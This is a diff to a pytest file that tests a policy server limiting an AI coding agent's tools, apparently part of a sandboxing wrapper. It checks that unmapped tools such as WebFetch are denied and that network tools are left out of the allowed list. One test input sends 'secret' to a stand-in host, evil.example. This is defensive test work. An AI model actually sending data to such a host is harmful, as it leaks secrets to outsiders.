@@ -17,6 +17,7 @@ import pytest
 from codeforge import claude_code_executor as cce
 from codeforge import claude_code_policy_hook as hook
 from codeforge.claude_code_executor import (
+    CLAUDE_CODE_TOOLS,
     ClaudeCodeCLIError,
     ClaudeCodeExecutor,
     PolicySocketServer,
@@ -291,6 +292,31 @@ class TestPolicySocketServer:
         assert reply["decision"] == "deny"
         assert runtime.calls == []
 
+    # Only tools the Go policy maps to a built-in tool are decided by Go: an
+    # unmapped tool would escape mode tool lists and be allowed by the default
+    # of permissive presets (WebFetch while Bash denies curl).
+    @pytest.mark.parametrize(
+        "tool_name",
+        ["WebFetch", "WebSearch", "Task", "Agent", "TodoWrite", "Workflow", "REPL", "PowerShell", "mcp__x__y", "bash"],
+    )
+    async def test_unmapped_tool_is_denied_without_asking_go(self, tool_name: str) -> None:
+        runtime = _FakeRuntime("allow")
+        async with PolicySocketServer(runtime, decision_timeout=5) as server:
+            reply = await _ask(server, _request(server, tool_name, {"url": "https://evil.example/?q=secret"}))
+
+        assert reply["decision"] == "deny"
+        assert tool_name in str(reply["reason"])
+        assert runtime.calls == []
+
+    @pytest.mark.parametrize("tool_name", CLAUDE_CODE_TOOLS)
+    async def test_mapped_tools_are_asked(self, tool_name: str) -> None:
+        runtime = _FakeRuntime("allow")
+        async with PolicySocketServer(runtime, decision_timeout=5) as server:
+            reply = await _ask(server, _request(server, tool_name, {}))
+
+        assert reply["decision"] == "allow"
+        assert [c["tool"] for c in runtime.calls] == [tool_name]
+
     async def test_request_tool_call_raising_is_denied(self) -> None:
         runtime = _FakeRuntime(exc=RuntimeError("nats down"))
         async with PolicySocketServer(runtime, decision_timeout=5) as server:
@@ -416,6 +442,27 @@ class TestBuildCliCommand:
         assert "--allowedTools" not in joined
         assert "--allowed-tools" not in joined
 
+    def test_tools_are_limited_to_the_tools_go_maps(self) -> None:
+        cmd = self._cmd()
+        i = cmd.index("--tools")
+        assert cmd[i + 1].split(",") == list(CLAUDE_CODE_TOOLS)
+        # --tools takes several values: the next argument must be an option.
+        assert cmd[i + 2].startswith("--")
+        assert set(CLAUDE_CODE_TOOLS) == {
+            "Read",
+            "Write",
+            "Edit",
+            "MultiEdit",
+            "NotebookEdit",
+            "Bash",
+            "Grep",
+            "Glob",
+            "LS",
+            "Monitor",
+        }
+        for network_tool in ("WebFetch", "WebSearch"):
+            assert network_tool not in cmd[i + 1]
+
     def test_pre_tool_use_hook_for_every_tool(self) -> None:
         settings = _settings_of(self._cmd())
         assert set(settings) == {"hooks"}
@@ -472,6 +519,7 @@ _FULL_HELP = """Usage: claude [options] [command] [prompt]
   --settings <file-or-json>   Path to a settings JSON file or a JSON string
   --strict-mcp-config         Only use MCP servers from --mcp-config
   --system-prompt <prompt>    System prompt to use for the session
+  --tools <tools...>          Specify the list of available tools from the built-in set
 """
 
 _FAKE_CLI = """#!{python}
@@ -678,7 +726,15 @@ class TestCliSupport:
 
     @pytest.mark.parametrize(
         "missing",
-        ["--setting-sources", "--settings", "--strict-mcp-config", "--mcp-config", "--permission-mode", "dontAsk"],
+        [
+            "--setting-sources",
+            "--settings",
+            "--strict-mcp-config",
+            "--mcp-config",
+            "--permission-mode",
+            "dontAsk",
+            "--tools",
+        ],
     )
     async def test_missing_flag_fails_closed(self, fake_cli: _FakeCli, tmp_path: Path, missing: str) -> None:
         help_text = "\n".join(line for line in _FULL_HELP.splitlines() if missing not in line)
